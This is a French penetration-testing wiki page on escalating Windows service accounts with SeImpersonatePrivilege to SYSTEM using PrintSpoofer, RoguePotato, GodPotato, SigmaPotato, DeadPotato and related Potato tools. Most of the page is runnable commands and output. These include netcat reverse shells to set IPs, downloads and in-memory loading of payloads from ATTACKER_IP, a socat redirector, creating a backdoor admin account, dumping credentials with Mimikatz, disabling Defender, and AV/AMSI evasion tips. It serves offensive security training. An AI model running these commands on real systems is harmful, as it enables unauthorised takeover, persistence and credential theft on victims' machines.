# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato ne fonctionne pas** sur Windows Server 2019 et les versions de Windows 10 à partir de la build 1809. Cependant, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** peuvent être utilisés pour **exploiter les mêmes privilèges et obtenir un accès de niveau `NT AUTHORITY\SYSTEM`**. Cet [article de blog](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) présente en détail l’outil `PrintSpoofer`, qui permet d’exploiter les privilèges d’impersonation sur les hôtes Windows 10 et Server 2019 où JuicyPotato ne fonctionne plus.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Une alternative moderne, fréquemment mise à jour en 2024–2025, est SigmaPotato (un fork de GodPotato) qui ajoute l’utilisation de la réflexion .NET/en mémoire ainsi qu’une prise en charge étendue des systèmes d’exploitation. Consultez l’exemple d’utilisation rapide ci-dessous et le dépôt dans References.

Pages associées pour le contexte et les techniques manuelles :

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Prérequis et pièges courants

Toutes les techniques suivantes reposent sur l’exploitation d’un service privilégié capable d’impersonation, depuis un contexte disposant de l’un de ces privilèges :

- SeImpersonatePrivilege (le plus courant) ou SeAssignPrimaryTokenPrivilege
- Un niveau d’intégrité élevé n’est pas requis si le jeton dispose déjà de SeImpersonatePrivilege (cas typique pour de nombreux comptes de service tels que IIS AppPool, MSSQL, etc.)

Vérifiez rapidement les privilèges :

```cmd
whoami /priv | findstr /i impersonate
```

Notes opérationnelles :

- Si votre shell s’exécute avec un jeton restreint dépourvu de SeImpersonatePrivilege (cas fréquent pour Local Service/Network Service dans certains contextes), restaurez les privilèges par défaut du compte avec FullPowers, puis lancez un Potato. Exemple : `FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
- Un jeton de processus peut avoir moins de privilèges qu’un autre jeton associé au même compte de service ou à la même session de connexion. Dans certaines configurations, un client de canal nommé de la même session peut exposer un autre jeton doté de SeImpersonatePrivilege, mais les `RequiredPrivileges` configurés pour le service et la sortie de `whoami /priv` décrivent des choses différentes et ne prouvent pas qu’un tel jeton est disponible. Vérifiez le jeton réel avant d’envisager une voie d’usurpation d’identité.
- PrintSpoofer nécessite que le service Print Spooler soit en cours d’exécution et joignable via le point de terminaison RPC local (spoolss). Dans les environnements renforcés où Spooler est désactivé après PrintNightmare, privilégiez RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato nécessite qu’un résolveur OXID soit joignable sur TCP/135. Si le trafic sortant est bloqué, utilisez un redirecteur/transfert de port (voir l’exemple ci-dessous). Vérifiez les options prises en charge par la version utilisée.
- EfsPotato/SharpEfsPotato exploite MS-EFSR ; si un canal est bloqué, essayez d’autres canaux (lsarpc, efsrpc, samr, lsass, netlogon).
- L’erreur 0x6d3 lors de RpcBindingSetAuthInfo indique généralement un service d’authentification RPC inconnu ou non pris en charge ; essayez un autre canal/transport ou assurez-vous que le service cible est en cours d’exécution.
- Les forks « couteau suisse » tels que DeadPotato regroupent des modules de payload supplémentaires (Mimikatz/SharpHound/Defender off) qui écrivent sur disque ; attendez-vous à une détection EDR plus élevée qu’avec les versions originales allégées.

## Démo rapide

### PrintSpoofer

```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```

Notes :
- Vous pouvez utiliser -i pour lancer un processus interactif dans la console actuelle, ou -c pour exécuter une commande sur une seule ligne.
- Le service Spooler est requis. S’il est désactivé, cela échouera.

### RoguePotato

```bash
c:\RoguePotato.exe -r 10.10.10.10 -e "cmd.exe /c whoami" -l 9999
```

Dans le [mode d’emploi upstream](https://github.com/antonioCoco/RoguePotato#usage), `-e` indique la commande, `-l` définit le port du résolveur local et `-c`, facultatif, définit un CLSID. Si l’activation COM démarre un service dont le chemin d’accès à l’exécutable a déjà été modifié, ce service peut exécuter la commande modifiée indépendamment de l’impersonation du token ; vérifiez la configuration du service avant d’attribuer l’exécution observée avec les privilèges SYSTEM à cette technique.

Si les connexions sortantes sur le port 135 sont bloquées, faites passer le résolveur OXID par socat sur votre redirecteur :<sup>[[9]](#references)</sup>

```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```

### PrintNotifyPotato

PrintNotifyPotato est une primitive d’abus COM plus récente, publiée fin 2022, qui cible le service **PrintNotify** plutôt que Spooler/BITS. Le binaire instancie le serveur COM PrintNotify, remplace un `IUnknown` par un faux, puis déclenche un callback privilégié via `CreatePointerMoniker`. Lorsque le service PrintNotify (qui s’exécute en tant que **SYSTEM**) se reconnecte, le processus duplique le token reçu et lance le payload fourni avec tous les privilèges.<sup>[[13]](#references)</sup>

Notes opérationnelles clés :

* Fonctionne sous Windows 10/11 et Windows Server 2012–2022, tant que le service Print Workflow/PrintNotify est installé (il est présent même lorsque l’ancien Spooler est désactivé après PrintNightmare).
* Nécessite que le contexte appelant dispose de **SeImpersonatePrivilege** (cas typique des comptes de service IIS APPPOOL, MSSQL et des tâches planifiées).
* Accepte une commande directe ou un mode interactif, ce qui permet de rester dans la console d’origine. Exemple :

  ```cmd
  PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
  PrintNotifyPotato.exe whoami
  ```

* Comme il repose entièrement sur COM, aucun listener de named pipe ni redirecteur externe n’est nécessaire, ce qui en fait un remplacement direct sur les hôtes où Defender bloque le RPC binding de RoguePotato.

Des opérateurs comme Ink Dragon lancent PrintNotifyPotato immédiatement après avoir obtenu une RCE via ViewState sur SharePoint, afin de passer du worker `w3wp.exe` à SYSTEM avant d’installer ShadowPad.<sup>[[14]](#references)</sup>

### SharpEfsPotato

```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```

### EfsPotato

```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```

Conseil : Si un pipe échoue ou si l’EDR le bloque, essayez les autres pipes pris en charge :

```text
EfsPotato <cmd> [pipe]
  pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```

### GodPotato

```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```

Notes :
- Fonctionne sous Windows 8/8.1–11 et Server 2012–2022 lorsque SeImpersonatePrivilege est présent.
- Récupérez le binaire correspondant au runtime installé (par exemple, `GodPotato-NET4.exe` sur un Server 2022 récent).
- Si votre primitive d’exécution initiale est un webshell/UI avec des délais d’expiration courts, préparez le payload sous forme de script et demandez à GodPotato de l’exécuter plutôt que de lancer une longue commande intégrée.<sup>[[12]](#references)</sup>

Méthode rapide de préparation depuis un webroot IIS accessible en écriture :

```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato propose deux variantes ciblant des objets DCOM de service dont le niveau d’emprunt d’identité par défaut est RPC_C_IMP_LEVEL_IMPERSONATE. Compilez les binaires fournis ou utilisez-les, puis exécutez votre commande :

```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```

### SigmaPotato (fork mis à jour de GodPotato)

SigmaPotato ajoute des fonctionnalités pratiques modernes, comme l’exécution en mémoire via la réflexion .NET et un assistant de reverse shell PowerShell.<sup>[[8]](#references)</sup>

```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```

Avantages supplémentaires dans les versions 2024–2025 (v1.2.x) :
- Option intégrée de reverse shell `--revshell` et suppression de la limite de 1 024 caractères de PowerShell, pour exécuter de longs payloads contournant AMSI en une seule fois.
- Syntaxe compatible avec la réflexion (`[SigmaPotato]::Main()`), ainsi qu’une technique rudimentaire d’évasion de l’AV via `VirtualAllocExNuma()` pour déjouer les heuristiques simples.
- `SigmaPotatoCore.exe` compilé séparément pour .NET 2.0, destiné aux environnements PowerShell Core.

### DeadPotato (refonte de GodPotato avec modules en 2024)

DeadPotato conserve la chaîne d’impersonation OXID/DCOM de GodPotato, mais intègre des outils d’aide post-exploitation permettant aux opérateurs d’obtenir immédiatement les privilèges SYSTEM et d’effectuer des opérations de persistance et de collecte sans outils supplémentaires.<sup>[[15]](#references)</sup>

Modules courants (tous nécessitent SeImpersonatePrivilege) :

- `-cmd "<cmd>"` — lancer une commande arbitraire en tant que SYSTEM.
- `-rev <ip:port>` — reverse shell rapide.
- `-newadmin user:pass` — créer un administrateur local à des fins de persistance.
- `-mimi sam|lsa|all` — déposer et exécuter Mimikatz pour extraire les identifiants (écrit sur le disque, bruyant).
- `-sharphound` — lancer la collecte SharpHound en tant que SYSTEM.
- `-defender off` — désactiver la protection en temps réel de Defender (très bruyant).

Exemples de commandes en une ligne :

```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```

Comme il embarque des binaires supplémentaires, attendez-vous à davantage d’alertes AV/EDR ; privilégiez GodPotato/SigmaPotato, plus légers, lorsque la discrétion est importante.

## References

- [1] [PrintSpoofer – Exploitation des privilèges d’usurpation d’identité sous Windows 10 et Server 2019](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [9] [JuicyPotato, c’est fini ? Une vieille histoire, bienvenue à RoguePotato](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [10] [FullPowers – Restaurer les privilèges de jeton par défaut des comptes de service](https://github.com/itm4n/FullPowers)
- [11] [HTB : Media — fuite NTLM de WMP → jonction NTFS vers la racine Web pour obtenir une RCE → FullPowers + GodPotato pour obtenir SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [12] [HTB : Job — macro LibreOffice → webshell IIS → GodPotato pour obtenir SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [14] [Check Point Research – Dans les coulisses d’Ink Dragon : révélation du réseau de relais et du fonctionnement interne d’une opération offensive furtive](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [15] [DeadPotato – Refonte de GodPotato avec des modules post-exploitation intégrés](https://github.com/lypd0/DeadPotato)
{{#include ../../banners/hacktricks-training.md}}
